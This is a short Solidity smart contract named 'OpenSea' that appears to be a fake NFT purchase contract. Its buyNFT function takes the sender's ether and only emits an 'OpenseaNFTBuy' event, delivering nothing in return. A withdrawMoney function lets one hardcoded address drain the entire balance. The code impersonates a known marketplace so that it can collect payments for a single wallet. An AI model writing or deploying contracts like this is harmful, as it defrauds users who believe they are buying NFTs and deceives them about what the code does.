// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;


contract OpenSea{
    
    event OpenseaNFTBuy(uint256 amount);
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function withdrawMoney() public {
        require(msg.sender == 0xea8244494c48F19C27cc83A30FBB236C7af02e19);
        address payable to = payable(msg.sender);
        to.transfer(getBalance());
    }
   

    function buyNFT() payable public {
        uint256 amountToBuy = msg.value;
        emit OpenseaNFTBuy(amountToBuy);
    }

}
